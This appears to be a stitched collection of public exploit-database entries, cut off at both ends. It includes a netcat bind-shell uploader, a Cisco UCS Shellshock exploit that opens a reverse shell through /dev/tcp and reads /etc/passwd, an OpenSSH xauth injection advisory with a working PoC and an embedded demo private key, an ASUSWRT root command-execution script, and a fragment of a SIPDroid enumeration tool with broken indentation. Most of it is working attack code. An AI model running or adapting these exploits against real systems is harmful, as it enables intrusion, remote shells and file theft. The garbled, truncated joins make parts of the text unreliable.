        buff1='_file_manager_operations_copy_files_Loc_Rem_c:\\^file\r\n\x0brewt_ha.bat'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1 += ('\\x' + h).decode('string_escape')
	buff1 += '\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00tftp -i ' + tftpd + ' GET nc.exe c:\\nc.exe                           '
	buff1+='\r\nc:\\nc.exe -L -d -p 4444 -e cmd.exe                 \r\n\r\n         '
	buff1+='      \r\n\r\n_file_manager_operations_get_cur_dir_c:\r\n'
	try:
		print "[+] Connecting to %s" %host
	        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((host,int(port)))
		print "[+] Uploading Files"
		s.send(buff1)
	        time.sleep(2)
	        s.send('+run_C:\\rewt_ha.bat|\r\n')
	        time.sleep(1)
	        print "[+] DONE [+]"
                print "[+] Now Connect to port 4444 on victim IP !!!"
	except:
		print "[+] Could not connect to the server"


if len(sys.argv)<7:
       usage()
       sys.exit()
try:
       options = getopt.getopt(sys.argv[1:], 'h:p:t:')[0]
except getopt.GetoptError, err:
       print err
       usage()
       sys.exit()


for option, value in options:
       if option == '-h':
           host = value
       if option == '-p':
           port = int(value)
       if option == '-t':
           tftpd=value
exploit()

# milw0rm.com [2007-05-19]
#!/usr/bin/python
###############################################
# Cisco UCS Manager 2.1(1b) Shellshock Exploit
# 
# CVE-2014-6278
# Confirmed on version 2.1(1b), but more are likely vulnerable.
# Cisco's advisory: 
# https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140926-bash
# Exploit generates a reverse shell to a nc listener.
# Exploit Author: @thatchriseckert
###############################################

import sys
import requests
import time
 
if len(sys.argv) < 4:
	print "\n[*] Cisco UCS Manager 2.1(1b) Shellshock Exploit"
	print "[*] Usage: <Victim IP> <Attacking Host> <Reverse Shell Port>" 
	print "[*]"
	print "[*] Example: shellshock.py 127.0.0.1 127.0.0.1 4444"
	print "[*] Listener: nc -lvp <port>"
	print "\n"
	sys.exit()

#Disables request warning for cert validation ignore.
requests.packages.urllib3.disable_warnings() 
ucs = sys.argv[1]
url = "https://" + ucs + "/ucsm/isSamInstalled.cgi"
attackhost = sys.argv[2]
revshellport = sys.argv[3]
headers1 = {
		'User-Agent': '() { ignored;};/bin/bash -i >& /dev/tcp/' + attackhost + '/' + revshellport + ' 0>&1'
		}
headers2 = {
		"User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo $(</etc/passwd)'
		}

def exploit():
	try:
		r = requests.get(url, headers=headers1, verify=False, timeout=5)
	except Exception, e:
		if 'timeout' in str(e):
			print "[+] Success.  Enjoy your shell..."
		else:
			print "[-] Something is wrong..."
			print "[-] Error: " + str(e)

def main():
	try:
		r = requests.get(url, headers=headers2, verify=False, timeout=3)
		if r.content.startswith('\nroot:'):
			print "[+] Host is vulnerable, spawning shell..."
			time.sleep(3)
			exploit()
		else:
			print "[-] Host is not vulnerable, quitting..."
			sys.exit()
	except Exception, e:
		print "[-] Something is wrong..."
		print "[-] Error: " + str(e)

if __name__ == "__main__":
	main()

'''
Author:     <github.com/tintinweb>
Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-3115
Version:    0.2
Date:       Mar 3rd, 2016

Tag:        openssh xauth command injection may lead to forced-command and /bin/false bypass

Overview
--------

Name:           openssh
Vendor:         OpenBSD
References:     * http://www.openssh.com/[1]

Version:        7.2p1 [2]
Latest Version: 7.2p1
Other Versions: <= 7.2p1 (all versions; dating back ~20 years)
Platform(s):    linux
Technology:     c

Vuln Classes:   CWE-93 - Improper Neutralization of CRLF Sequences ('CRLF Injection')
Origin:         remote
Min. Privs.:    post auth

CVE:            CVE-2016-3115



Description
---------

quote website [1]

> OpenSSH is the premier connectivity tool for remote login with the SSH protocol. It encrypts all traffic to eliminate eavesdropping, connection hijacking, and other attacks. In addition, OpenSSH provides a large suite of secure tunneling capabilities, several authentication methods, and sophisticated configuration options.
Summary
-------

An authenticated user may inject arbitrary xauth commands by sending an
x11 channel request that includes a newline character in the x11 cookie.
The newline acts as a command separator to the xauth binary. This attack requires
the server to have 'X11Forwarding yes' enabled. Disabling it, mitigates this vector.

By injecting xauth commands one gains limited* read/write arbitrary files,
information leakage or xauth-connect capabilities. These capabilities can be
leveraged by an authenticated restricted user - e.g. one with the login shell
configured as /bin/false or one with configured forced-commands - to bypass
account restriction. This is generally not expected.

The injected xauth commands are performed with the effective permissions of the
logged in user as the sshd already dropped its privileges.

Quick-Info:

* requires: X11Forwarding yes
* bypasses /bin/false and forced-commands
** OpenSSH does not treat /bin/false like /bin/nologin (in contrast to Dropbear)
* does not bypass /bin/nologin (as there is special treatment for this)

Capabilities (xauth):

* Xauth
	* write file: limited chars, xauthdb format
	* read file: limit lines cut at first \s
	* infoleak: environment
	* connect to other devices (may allow port probing)


PoC see ref github.
Patch see ref github.


Details
-------

// see annotated code below

    * server_input_channel_req (serverloop.c)
     *- session_input_channel_req:2299 (session.c [2])
      *- session_x11_req:2181

    * do_exec_pty or do_exec_no_pty
     *- do_child
      *- do_rc_files (session.c:1335 [2])

Upon receiving an `x11-req` type channel request sshd parses the channel request
parameters `auth_proto` and `auth_data` from the client ssh packet where
`auth_proto` contains the x11 authentication method used (e.g. `MIT-MAGIC-COOKIE-1`)
and `auth_data` contains the actual x11 auth cookie. This information is stored
in a session specific datastore. When calling `execute` on that session, sshd will
call `do_rc_files` which tries to figure out if this is an x11 call by evaluating
if `auth_proto` and `auth_data` (and `display`) are set. If that is the case AND
there is no system `/sshrc` existent on the server AND it no user-specific `$HOME/.ssh/rc`
is set, then `do_rc_files` will run `xauth -q -` and pass commands via `stdin`.
Note that `auth_data` nor `auth_proto` was sanitized or validated, it just contains
user-tainted data. Since `xauth` commands are passed via `stdin` and `\n` is a
command-separator to the `xauth` binary, this allows a client to inject arbitrary
`xauth` commands.

Sidenote #1: in case sshd takes the `$HOME/.ssh/rc` branch, it will pass the tainted
input as arguments to that script.
Sidenote #2: client code also seems to not sanitize `auth_data`, `auth_proto`. [3]

This is an excerpt of the `man xauth` [4] to outline the capabilities of this xauth
command injection:

	SYNOPSIS
       	xauth [ -f authfile ] [ -vqibn ] [ command arg ... ]

		add displayname protocolname hexkey
		generate displayname protocolname [trusted|untrusted] [timeout seconds] [group group-id] [data hexdata]
		[n]extract filename displayname...
		[n]list [displayname...]
		[n]merge [filename...]
		remove displayname...
		source filename
		info
		exit
		quit
		version
		help
		?
		
Interesting commands are:
	
	info	 - leaks environment information / path
			~# xauth info
			xauth:  file /root/.Xauthority does not exist
			Authority file:       /root/.Xauthority
			File new:             yes
			File locked:          no
			Number of entries:    0
			Changes honored:      yes
			Changes made:         no
			Current input:        (argv):1
	
	source	 - arbitrary file read (cut on first `\s`)
			# xauth source /etc/shadow
			xauth:  file /root/.Xauthority does not exist
			xauth: /etc/shadow:1:  unknown command "smithj:Ep6mckrOLChF.:10063:0:99999:7:::"
						
	extract  - arbitrary file write
			 * limited characters
	         * in xauth.db format
	         * since it is not compressed it can be combined with `xauth add` to
	           first store data in the database and then export it to an arbitrary
	           location e.g. to plant a shell or do other things.
	
	generate - connect to <ip>:<port> (port probing, connect back and pot. exploit
			   vulnerabilities in X.org
	
	
Source
------

Inline annotations are prefixed with `//#!`


/*
 * Run $HOME/.ssh/rc, /etc/ssh/sshrc, or xauth (whichever is found
 * first in this order).
 */
static void
do_rc_files(Session *s, const char *shell)
{
...
		snprintf(cmd, sizeof cmd, "%s -q -",				
		    options.xauth_location);
		f = popen(cmd, "w");							//#! run xauth -q -
		if (f) {
			fprintf(f, "remove %s\n",					//#! remove <user_tainted_data> - injecting \n auth_display injects xauth command
			    s->auth_display);
			fprintf(f, "add %s %s %s\n",				//#! \n injection
			    s->auth_display, s->auth_proto,
			    s->auth_data);
			pclose(f);
		} else {
			fprintf(stderr, "Could not run %s\n",
			    cmd);
		}
	}
}

Proof of Concept
----------------

Prerequisites:

* install python 2.7.x
* issue `#> pip install paramiko` to install `paramiko` ssh library for python 2.x
* make sure `poc.py`


 Usage: <host> <port> <username> <password or path_to_privkey>

        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key


poc:

1. configure one user (user1) for `force-commands` and another one with `/bin/false` in `/etc/passwd`:

#PUBKEY line - force commands: only allow "whoami"
#cat /home/user1/.ssh/authorized_keys
command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user1@box

#cat /etc/passwd
user2:x:1001:1002:,,,:/home/user2:/bin/false
	
2. run sshd with `X11Forwarding yes` (kali default config)

#> /root/openssh-7.2p1/sshd -p 22 -f sshd_config -D -d

3. `forced-commands` - connect with user1 and display env information

#> python <host> 22 user1 .demoprivkey

INFO:__main__:add this line to your authorized_keys file:
#PUBKEY line - force commands: only allow "whoami"
#cat /home/user/.ssh/authorized_keys
command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user@box

INFO:__main__:connecting to: user1:<PKEY>@host:22
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#> .info
DEBUG:__main__:auth_cookie: '\ninfo'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:Authority file:       /home/user1/.Xauthority
File new:             no
File locked:          no
Number of entries:    1
Changes honored:      yes
Changes made:         no
Current input:        (stdin):3
/usr/bin/xauth: (stdin):2:  bad "add" command line
...
		
4. `forced-commands` - read `/etc/passwd`

...
#> .readfile /etc/passwd
DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...

5. `forced-commands` - write `/tmp/testfile`

#> .writefile /tmp/testfile `thisisatestfile`
DEBUG:__main__:auth_cookie: '\nadd 127.0.0.250:65500 `thisisatestfile` aa'
DEBUG:__main__:dummy exec returned: None
DEBUG:__main__:auth_cookie: '\nextract /tmp/testfile 127.0.0.250:65500'
DEBUG:__main__:dummy exec returned: None
DEBUG:__main__:/usr/bin/xauth: (stdin):2:  bad "add" command line

#> ls -lsat /tmp/testfile
4 -rw------- 1 user1 user1 59 xx xx 13:49 /tmp/testfile

#> cat /tmp/testfile
\FA65500hi\FA65500`thisisatestfile`\AA

6. `/bin/false` - connect and read `/etc/passwd`

#> python <host> 22 user2 user2password
INFO:__main__:connecting to: user2:user2password@host:22
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#> .readfile /etc/passwd
DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
user2:x:1001:1002:,,,:/home/user2:/bin/false
...
	
7. `/bin/false` - initiate outbound X connection to 8.8.8.8:6100

#> generate 8.8.8.8:100 .	

#> tcpdump
IP <host>.42033 > 8.8.8.8.6100: Flags [S], seq 1026029124, win 29200, options [mss 1460,sackOK,TS val 431416709 ecr 0,nop,wscale 10], length 0
	

Mitigation / Workaround
------------------------

* disable x11-forwarding: `sshd_config` set `X11Forwarding no`
* disable x11-forwarding for specific user with forced-commands: `no-x11-forwarding` in `authorized_keys`

Notes
-----

Verified, resolved and released within a few days. very impressive.

Vendor response: see advisory [5]

References
----------

[1] http://www.openssh.com/
[2] https://github.com/openssh/openssh-portable/blob/5a0fcb77287342e2fc2ba1cee79b6af108973dc2/session.c#L1388
[3] https://github.com/openssh/openssh-portable/blob/19bcf2ea2d17413f2d9730dd2a19575ff86b9b6a/clientloop.c#L376
[4] http://linux.die.net/man/1/xauth
[5] http://www.openssh.com/txt/x11fwd.adv
'''

#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : <github.com/tintinweb>
###############################################################################
#
# FOR DEMONSTRATION PURPOSES ONLY!
#
###############################################################################
import logging
import StringIO
import sys
import os

LOGGER = logging.getLogger(__name__)
try:
    import paramiko
except ImportError, ie:
    logging.exception(ie)
    logging.warning("Please install python-paramiko: pip install paramiko / easy_install paramiko / <distro_pkgmgr> install python-paramiko")
    sys.exit(1)

class SSHX11fwdExploit(object):
    def __init__(self, hostname, username, password, port=22, timeout=0.5, 
                 pkey=None, pkey_pass=None):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if pkey:
            pkey = paramiko.RSAKey.from_private_key(StringIO.StringIO(pkey),pkey_pass)
        self.ssh.connect(hostname=hostname, port=port, 
                         username=username, password=password, 
                         timeout=timeout, banner_timeout=timeout,
                         look_for_keys=False, pkey=pkey)
        
    def exploit(self, cmd="xxxx\n?\nsource /etc/passwd\n"):
        transport = self.ssh.get_transport()
        session = transport.open_session()
        LOGGER.debug("auth_cookie: %s"%repr(cmd))
        session.request_x11(auth_cookie=cmd)
        LOGGER.debug("dummy exec returned: %s"%session.exec_command(""))
        
        transport.accept(0.5)
        session.recv_exit_status()  # block until exit code is ready
        stdout, stderr = [],[]
        while session.recv_ready():
            stdout.append(session.recv(4096))
        while session.recv_stderr_ready():
            stderr.append(session.recv_stderr(4096))
        session.close()
        return ''.join(stdout)+''.join(stderr)              # catch stdout, stderr
    
    def exploit_fwd_readfile(self, path):
        data = self.exploit("xxxx\nsource %s\n"%path)
        if "unable to open file" in data:
            raise IOError(data)
        ret = []
        for line in data.split('\n'):
            st = line.split('unknown command "',1)
            if len(st)==2:
                ret.append(st[1].strip(' "'))
        return '\n'.join(ret)
    
    def exploit_fwd_write_(self, path, data):
        '''
        adds display with protocolname containing userdata. badchars=<space>
        
        '''
        dummy_dispname = "127.0.0.250:65500"
        ret = self.exploit('\nadd %s %s aa'%(dummy_dispname, data))
        if ret.count('bad "add" command line')>1:
            raise Exception("could not store data most likely due to bad chars (no spaces, quotes): %s"%repr(data))
        LOGGER.debug(self.exploit('\nextract %s %s'%(path,dummy_dispname)))
        return path
        
demo_authorized_keys = '''#PUBKEY line - force commands: only allow "whoami"
#cat /home/user/.ssh/authorized_keys
command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user@box
'''    
PRIVKEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtUaWCq7z5CM7wGH1/2XlNVMy7glVgYCVHjf8BUZo+FypdD69
9SPu06CZ3e0vSUx5KxlQ7vgU6CtH9nQli53oMy225a/RUGEon/axzVtwTpMnVLqn
PLEUn9zPaCjwwpg/Brhr5+NHc3bm/u/LHmKrEg6IjyWssE16exuhA3G/Teed+NaN
zKR3jVLrmXohc9dp57jYBPLZJ5NSojsd27LjdWnq/PokxwvkQOrOPkhTne+7GRts
U68nW5a99jMSb4bpgqsUsIY0IIsKc1nfzUxonvcXmh+RASIffLCzA0OdQyJ7UrPh
TLw8dVOK2e9zsJYlOYUA6G3rnzq9sNmqe7XdeQIDAQABAoIBAHu5M4sTIc8h5RRH
SBkKuMgOgwJISJ3c3uoDF/WZuudYhyeZ8xivb7/tK1d3HQEQOtsZqk2P8OUNNU6W
s1F5cxQLLXvS5i/QQGP9ghlBQYO/l+aShrY7vnHlyYGz/68xLkMt+CgKzaeXDc4O
aDnS6iOm27mn4xdpqiEAGIM7TXCjcPSQ4l8YPxaj84rHBcD4w033Sdzc7i73UUne
euQL7bBz5xNibOIFPY3h4q6fbw4bJtPBzAB8c7/qYhJ5P3czGxtqhSqQRogK8T6T
A7fGezF90krTGOAz5zJGV+F7+q0L9pIR+uOg+OBFBBmgM5sKRNl8pyrBq/957JaA
rhSB0QECgYEA1604IXr4CzAa7tKj+FqNdNJI6jEfp99EE8OIHUExTs57SaouSjhe
DDpBRSTX96+EpRnUSbJFnXZn1S9cZfT8i80kSoM1xvHgjwMNqhBTo+sYWVQrfBmj
bDVVbTozREaMQezgHl+Tn6G1OuDz5nEnu+7gm1Ud07BFLqi8Ssbhu2kCgYEA1yrc
KPIAIVPZfALngqT6fpX6P7zHWdOO/Uw+PoDCJtI2qljpXHXrcI4ZlOjBp1fcpBC9
2Q0TNUfra8m3LGbWfqM23gTaqLmVSZSmcM8OVuKuJ38wcMcNG+7DevGYuELXbOgY
nimhjY+3+SXFWIHAtkJKAwZbPO7p857nMcbBH5ECgYBnCdx9MlB6l9rmKkAoEKrw
Gt629A0ZmHLftlS7FUBHVCJWiTVgRBm6YcJ5FCcRsAsBDZv8MW1M0xq8IMpV83sM
F0+1QYZZq4kLCfxnOTGcaF7TnoC/40fOFJThgCKqBcJQZKiWGjde1lTM8lfTyk+f
W3p2+20qi1Yh+n8qgmWpsQKBgQCESNF6Su5Rjx+S4qY65/spgEOOlB1r2Gl8yTcr
bjXvcCYzrN4r/kN1u6d2qXMF0zrPk4tkumkoxMK0ThvTrJYK3YWKEinsucxSpJV/
nY0PVeYEWmoJrBcfKTf9ijN+dXnEdx1LgATW55kQEGy38W3tn+uo2GuXlrs3EGbL
b4qkQQKBgF2XUv9umKYiwwhBPneEhTplQgDcVpWdxkO4sZdzww+y4SHifxVRzNmX
Ao8bTPte9nDf+PhgPiWIktaBARZVM2C2yrKHETDqCfme5WQKzC8c9vSf91DSJ4aV
pryt5Ae9gUOCx+d7W2EU7RIn9p6YDopZSeDuU395nxisfyR1bjlv
-----END RSA PRIVATE KEY-----"""


if __name__=="__main__":
    logging.basicConfig(loglevel=logging.DEBUG)
    LOGGER.setLevel(logging.DEBUG)
    
    if not len(sys.argv)>4:
        print """ Usage: <host> <port> <username> <password or path_to_privkey>
        
        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key
        
"""
        sys.exit(1)
    hostname, port, username, password = sys.argv[1:]
    port = int(port)
    pkey = None
    if os.path.isfile(password):
        password = None
        with open(password,'r') as f:
            pkey = f.read()
    elif password==".demoprivkey":
        pkey = PRIVKEY
        password = None
        LOGGER.info("add this line to your authorized_keys file: \n%s"%demo_authorized_keys)
            
    LOGGER.info("connecting to: %s:%s@%s:%s"%(username,password if not pkey else "<PKEY>", hostname, port))
    ex = SSHX11fwdExploit(hostname, port=port,
                          username=username, password=password,
                          pkey=pkey,
                          timeout=10
                          )
    LOGGER.info("connected!")
    LOGGER.info ("""
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>
""")
    while True:
        cmd = raw_input("#> ").strip()
        if cmd.lower().startswith(".exit") or cmd.lower().startswith(".quit"):
            break
        elif cmd.lower().startswith(".info"):
            LOGGER.info(ex.exploit("\ninfo"))
        elif cmd.lower().startswith(".readfile"): 
            LOGGER.info(ex.exploit_fwd_readfile(cmd.split(" ",1)[1]))
        elif cmd.lower().startswith(".writefile"):
            parts = cmd.split(" ")
            LOGGER.info(ex.exploit_fwd_write_(parts[1],' '.join(parts[2:])))
        else:
            LOGGER.info(ex.exploit('\n%s'%cmd))
         
    # just playing around   
    #print ex.exploit_fwd_readfile("/etc/passwd")
    #print ex.exploit("\ninfo")
    #print ex.exploit("\ngenerate <ip>:600<port> .")                # generate <ip>:port  port=port+6000
    #print ex.exploit("\nlist")
    #print ex.exploit("\nnlist")
    #print ex.exploit('\nadd xx xx "\n')
    #print ex.exploit('\ngenerate :0 . data "')
    #print ex.exploit('\n?\n')
    #print ex.exploit_fwd_readfile("/etc/passwd")
    #print ex.exploit_fwd_write_("/tmp/somefile", data="`whoami`")
    LOGGER.info("--quit--")
#!/usr/bin/env python3

# Exploit Title: ASUSWRT 3.0.0.4.376_1071 LAN Backdoor Command Execution
# Date: 2014-10-11
# Vendor Homepage: http://www.asus.com/
# Software Link: http://dlcdnet.asus.com/pub/ASUS/wireless/RT-N66U_B1/FW_RT_N66U_30043762524.zip
# Source code: http://dlcdnet.asus.com/pub/ASUS/wireless/RT-N66U_B1/GPL_RT_N66U_30043762524.zip
# Tested Version: 3.0.0.4.376_1071-g8696125
# Tested Device: RT-N66U

# Description:
# A service called "infosvr" listens on port 9999 on the LAN bridge.
# Normally this service is used for device discovery using the
# "ASUS Wireless Router Device Discovery Utility", but this service contains a
# feature that allows an unauthenticated user on the LAN to execute commands
# <= 237 bytes as root. Source code is in asuswrt/release/src/router/infosvr.
# "iboxcom.h" is in asuswrt/release/src/router/shared.
#
# Affected devices may also include wireless repeaters and other networking
# products, especially the ones which have "Device Discovery" in their features
# list.
#
# Using broadcast address as the IP address should work and execute the command
# on all devices in the network segment, but only receiving one response is
# supported by this script.

import sys, os, socket, struct


PORT = 9999

if len(sys.argv) < 3:
    print('Usage: ' + sys.argv[0] + ' <ip> <command>', file=sys.stderr)
    sys.exit(1)


ip = sys.argv[1]
cmd = sys.argv[2]

enccmd = cmd.encode()

if len(enccmd) > 237:
    # Strings longer than 237 bytes cause the buffer to overflow and possibly crash the server. 
    print('Values over 237 will give rise to undefined behaviour.', file=sys.stderr)
    sys.exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', PORT))
sock.settimeout(2)

# Request consists of following things
# ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO
# PacketType    [byte]      ; NET_PACKET_TYPE_CMD
# OpCode        [word]      ; NET_CMD_ID_MANU_CMD
# Info          [dword]     ; Comment: "Or Transaction ID"
# MacAddress    [byte[6]]   ; Double-wrongly "checked" with memcpy instead of memcmp
# Password      [byte[32]]  ; Not checked at all
# Length        [word]
# Command       [byte[420]] ; 420 bytes in struct, 256 - 19 unusable in code = 237 usable

packet = (b'\x0C\x15\x33\x00' + os.urandom(4) + (b'\x00' * 38) + struct.pack('<H', len(enccmd)) + enccmd).ljust(512, b'\x00')

sock.sendto(packet, (ip, PORT))


# Response consists of following things
# ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO
# PacketType    [byte]      ; NET_PACKET_TYPE_RES
# OpCode        [word]      ; NET_CMD_ID_MANU_CMD
# Info          [dword]     ; Equal to Info of request
# MacAddress    [byte[6]]   ; Filled in for us
# Length        [word]
# Result        [byte[420]] ; Actually returns that amount

while True:
    data, addr = sock.recvfrom(512)

    if len(data) == 512 and data[1] == 22:
        break

length = struct.unpack('<H', data[14:16])[0]
s = slice(16, 16+length)
sys.stdout.buffer.write(data[s])

sock.close()
source: http://www.securityfocus.com/bid/47710/info

sipdroid is prone to a user-enumeration weakness.

An attacker may leverage this issue to harvest valid usernames, which may aid in brute-force attacks.

sipdroid 1.6.1, 2.0.1, and 2.2 running on Android 2.1 are vulnerable; other versions may also be affected. 

#!/usr/bin/env python
# Adapted from SipVicious by Anibal Aguiar - anibal.aguiar *SPAM*
tempest.com.br
#
# This code is only for security researches/teaching purposes,use at
your own risk!


import sys
import random

def printmsg(msg, color):
OKGREEN = '\033[92m'
OKBLUE = '\033[96m'
ENDC = '\033[0m'
WARN = '\033[91m'

if color is "Blue":
return OKBLUE + msg + ENDC
elif color is "Green":
return OKGREEN + msg + ENDC
elif color is "WARNING":
return WARN + msg + ENDC

def makeRequest(method,dspname,toaddr,
dsthost,port,callid,srchost='',
branchunique=None,localtag=None,
extension=None,body='',useragent=None,
cseq=1,auth=None,contact='<sip:123@1.1.1.1>',
accept='application/sdp',contentlength=None,
localport=5060,contenttype=None):

if extension is None:
uri = 'sip:%s' % dsthost
else:
uri = 'sip:%s@%s' % (extension,dsthost)
if branchunique is None:
branchunique = '%s' % random.getrandbits(32)
headers = dict()
finalheaders = dict()
superheaders = dict()
superheaders['Via'] = 'SIP/2.0/UDP %s:%s;branch=z9hG4bK%s;rport' %
(srchost,localport,branchunique)
headers['Max-Forwards'] = 70
headers['To'] = uri
headers['From'] = "\"%s\"" % dspname
if useragent is None:
headers['User-Agent'] = 'friendly-scanner'
headers['From'] += ';tag=as%s' % localtag
headers['Call-ID'] = "%s@%s" % (callid,srchost)
if contact is not None:
headers['Contact'] = contact
headers['CSeq'] = '%s %s' % (cseq,method)
headers['Max-Forwards'] = 70
headers['Accept'] = accept
if contentlength is None:
headers['Content-Length'] = len(body)
else:
headers['Content-Length'] = contentlength
if contenttype is None and len(body) > 0:
contenttype = 'application/sdp'
if contenttype is not None:
headers['Content-Type'] = contenttype

r = '%s %s SIP/2.0\r\n' % (method,uri)
for h in superheaders.iteritems():
r += '%s: %s\r\n' % h
for h in headers.iteritems():
r += '%s: %s\r\n' % h
for h in finalheaders.iteritems():
r += '%s: %s\r\n' % h
r += '\r\n'
r += body
return r, branchunique


----[SIPDroid-Extension_Enum.py]----------------------------------------------------------------------------------------

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Anibal Aguiar - anibal.aguiar *SPAM* tempest.com.br
#
# Dependences:
#
# optparse - The optparse library can be installed using the linux
repository
# of your distro.
#
# myHelper -- myHelper.py should be placed at the same diretory of
SIPDroid-Extension_Enum.py
#
# This software is based on some functions of sipvicious-0.2.6.
#
# This code is only for security researches/teaching purposes,use at
your own risk!
#

import sys
import random
import re
from optparse import OptionParser
from socket import *
from myhelper import *


parse = OptionParser()
parse.add_option("-i", "--ip", dest="ip", help="Target IP range (CIDR or
unique IP). (MANDATORY)")
parse.add_option("-s", "--source", dest="source", help="Source IP
number. (MANDATORY)")
parse.add_option("-f", "--srcfake", dest="srcfake", help="Source IP
number (fake).")
parse.add_option("-p", "--dstport", dest="dstport", default=5060,
help="Destine port number (MAMDATORY due to SIPDroid Random port).
(default 5060)")
parse.add_option("-e", "--extension", dest="exten", default=None,
help="Destine extension. (default None)")
parse.add_option("-t", "--tag", dest="tag", default=None, help="Call
TAG. (default random)")
parse.add_option("-v", "--verbose", action="store_true", dest="debug",
default="False", help="Verbose mode - print pakets sent and received.
(default False)")

(options, arg) = parse.parse_args()

if not options.exten:
extension = "SIPDROID"
else:
extension = options.exten
if not options.srcfake:
srcfake = '1.1.1.1'
else:
srcfake = options.srcfake
dstport = int(options.dstport)

if not options.ip or not options.source:
